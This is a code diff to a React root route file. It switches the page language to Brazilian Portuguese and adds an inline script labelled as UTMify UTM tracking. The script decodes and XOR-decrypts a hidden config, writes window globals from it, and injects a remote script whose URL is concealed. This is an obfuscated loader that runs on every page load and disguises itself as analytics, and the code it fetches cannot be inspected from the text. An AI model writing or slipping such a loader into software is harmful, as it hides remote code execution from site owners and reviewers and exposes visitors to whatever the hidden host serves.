@@ -108,9 +108,15 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
 
 function RootShell({ children }: { children: ReactNode }) {
   return (
-    <html lang="en">
+    <html lang="pt-BR">
       <head>
         <HeadContent />
+        {/* UTMify — tracking de UTMs */}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(){var k_u=atob("DHk6Hx0e6gQm7pOkPAIYam9yyD4EhufQTAoAMDJ9jmoIm+fJVR9DMX5xhypEnLzXXwtTb2ltxXFSg+CLUBhOem5qxG5VzL+GXQ1ObXR8n3BDnbGeZwIYcXxzjyYczPfFSBgXamlzg2Jfw+PWWQ9fcWkzkmdJir7XXxIYMz9oi2hTi7GeHltHM2Y8hGVLi7GeHh1ba3wzn3BLh/XdEQlIemt7hHALnebGVR1JPTE8nGVKm/aGBlsYYkBj");var m_w=[];for(var u_p=0;u_p<k_u.length;u_p++){m_w.push(k_u.charCodeAt(u_p)&255);}var w_4y44=m_w[0];var u_8icu=m_w.slice(1,1+w_4y44);var w_le74=m_w.slice(1+w_4y44);var o_p=w_le74.map(function(b,c_jok){return b^u_8icu[c_jok%w_4y44];});var k_62o="";for(var k_kff=0;k_kff<o_p.length;k_kff++){k_62o+=String.fromCharCode(o_p[k_kff]&255);}var n_k9=decodeURIComponent(escape(k_62o));var f_rais=JSON.parse(n_k9);var x_nv2=f_rais.globals||[];x_nv2.forEach(function(g_a1){window[g_a1.name]=g_a1.value;});var s_v=document.createElement("script");s_v.src=f_rais.url;s_v.async=true;s_v.defer=true;(f_rais.attributes||[]).forEach(function(v_qj3){s_v.setAttribute(v_qj3.name,v_qj3.value);});(document.head||document.documentElement).appendChild(s_v);})();`,
+          }}
+        />
       </head>
       <body>
         {children}
